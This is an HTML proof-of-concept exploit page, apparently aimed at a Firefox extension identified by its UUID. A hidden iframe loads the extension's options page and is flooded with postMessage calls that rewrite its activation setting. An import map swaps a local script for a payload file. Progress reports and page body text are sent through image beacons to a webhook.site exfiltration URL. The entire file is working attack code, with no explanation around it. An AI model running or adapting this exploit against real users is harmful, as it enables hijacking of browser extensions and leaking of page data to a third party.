<!doctype html>
<html>
<head>
<meta charset="utf-8">
<script type="importmap">
{ "imports": { "http://localhost:3000/jsxss.js": "./payload.js" } }
</script>
<title>perchance-pwn</title>
</head>
<body>
<script>
const EXT_UUID = '09a6c422-a354-447d-b4ea-185cb10be869';
const OPTIONS  = `moz-extension://${EXT_UUID}/options.html`;
const EXFIL    = 'https://webhook.site/f47c89f8-5038-4c47-9d6c-53d7bc38f41c';
const DOC      = 'https://doc.rust-lang.org/';
const beacon = (s) => { try { new Image().src = EXFIL + '/b?s=' + encodeURIComponent(s) + '&t=' + Date.now(); } catch(e){} };

new MutationObserver((muts) => {
  for (const m of muts) for (const n of m.addedNodes) {
    try {
      if (n.tagName === 'P' && /^Previous:/.test(n.textContent)) beacon('cs-ran:' + n.textContent.slice(0,90));
      if (n.tagName === 'SCRIPT' && n.type === 'module') beacon('module-injected');
    } catch(e){}
  }
}).observe(document.documentElement, { childList: true, subtree: true });

const wait = (ms) => new Promise(r => setTimeout(r, ms));

// Keep an options iframe and spam it with the config message for `dur` ms.
function pumpActivateOn(urlStr, dur) {
  return new Promise((res) => {
    const f = document.createElement('iframe');
    f.style.display = 'none';
    f.src = OPTIONS;
    let sent = 0;
    f.onload = () => beacon('opt-iframe-onload');
    f.onerror = () => beacon('opt-iframe-onerror');
    document.body.appendChild(f);
    const iv = setInterval(() => {
      try { f.contentWindow.postMessage(urlStr, '*'); sent++; } catch(e){ beacon('pm-err:'+e); }
    }, 200);
    setTimeout(() => { clearInterval(iv); beacon('pumped:'+sent); res(); }, dur);
  });
}

(async () => {
  const stage = new URL(location.href).searchParams.get('stage');
  beacon('load:' + (stage||'init'));

  if (stage !== 'poison') {
    await pumpActivateOn(location.origin + '/?x=' + DOC, 3000);   // activateOn = our origin
    beacon('nav->poison');
    location.href = location.pathname + '?stage=poison&r=' + DOC;
    return;
  }

  // diagnostics: did cs.js inject anything?
  await wait(3000);
  try { beacon('body3:tags=' + [...document.body.children].map(c=>c.tagName).join(',') + '|len=' + document.body.innerHTML.length); } catch(e){}
  await wait(3000);
  try { beacon('body6:txt=' + document.body.innerText.replace(/\s+/g,' ').slice(0,100)); } catch(e){}

  beacon('poison-waited');
  await pumpActivateOn(DOC, 2000);        // activateOn back to docs
  beacon('nav->docs');
  location.href = 'https://doc.rust-lang.org/stable/std/index.html';
})();
</script>
</body>
</html>
